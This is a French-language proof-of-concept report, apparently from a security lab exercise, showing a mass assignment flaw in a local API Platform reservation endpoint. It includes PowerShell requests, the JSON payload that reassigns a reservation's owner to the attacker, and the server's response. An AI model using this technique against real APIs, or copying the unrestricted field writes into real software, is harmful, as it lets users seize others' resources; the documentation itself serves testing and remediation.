# Preuve — Mass Assignment

## Endpoint concerné
`PATCH /api/reservations/{id}`

## Description
L'API accepte, sans aucune restriction de champs modifiables (pas de
whitelist/DTO), n'importe quel champ envoyé dans le body JSON — y compris le
champ `owner`, qui définit le propriétaire de la réservation. Un utilisateur
peut ainsi s'attribuer une réservation appartenant à quelqu'un d'autre.

## Cause technique
API Platform expose par défaut toutes les propriétés de l'entité
`Reservation` en écriture sur l'opération `Patch`, sans groupe de validation
ni DTO restreignant les champs modifiables selon le rôle de l'utilisateur.

## Prérequis pour ce test
L'entité `User` a été temporairement exposée en `ApiResource` (branche
`vulnerable` uniquement) afin de pouvoir référencer un utilisateur par IRI
(`/api/users/{id}`) dans le payload.

## Exploitation

1. Connexion en tant que `user@test.com` (id 3), récupération du token.

2. Consultation de la liste des utilisateurs (voir aussi le fichier
   `bonus-information-disclosure/preuve.md`) pour récupérer les IRIs :
```powershell
Invoke-RestMethod -Uri "http://localhost:8086/api/users" -Method Get -Headers @{ Authorization = "Bearer $token" }
```

3. Vol de la réservation #2 (appartenant à `admin@test.com`, id 4) en
   changeant son `owner` vers l'attaquant (id 3) :
```powershell
Invoke-RestMethod -Uri "http://localhost:8086/api/reservations/2" -Method Patch -Headers @{ Authorization = "Bearer $token"; "Content-Type" = "application/merge-patch+json" } -Body '{"owner":"/api/users/3"}'
```

## Payload utilisé
```json
{ "owner": "/api/users/3" }
```

## Réponse serveur obtenue (200 OK)
```json
{
  "@context": "/api/contexts/Reservation",
  "@id": "/api/reservations/2",
  "@type": "Reservation",
  "id": 2,
  "resourceName": "Salle de coworking B",
  "startAt": "2026-07-16T10:00:00+00:00",
  "status": "cancelled",
  "note": "Réservation admin - test",
  "owner": "/api/users/3"
}
```

Le champ `owner` est bien passé de `/api/users/4` (admin) à `/api/users/3`
(l'attaquant) : la réservation a changé de propriétaire sans qu'aucune
vérification n'ait bloqué l'opération.

## Impact
- Technique : n'importe quel champ de l'entité est modifiable via l'API,
  sans distinction entre champs "publics" et champs sensibles.
- Métier : un utilisateur peut voler la propriété d'une ressource
  appartenant à un autre client ou à un administrateur, avec des
  conséquences potentielles sur la facturation, les responsabilités
  contractuelles, etc.

## Criticité
**Élevée** — combinée au BOLA, cette faille permet une prise de contrôle
complète sur des ressources appartenant à d'autres utilisateurs.

## Captures d'écran

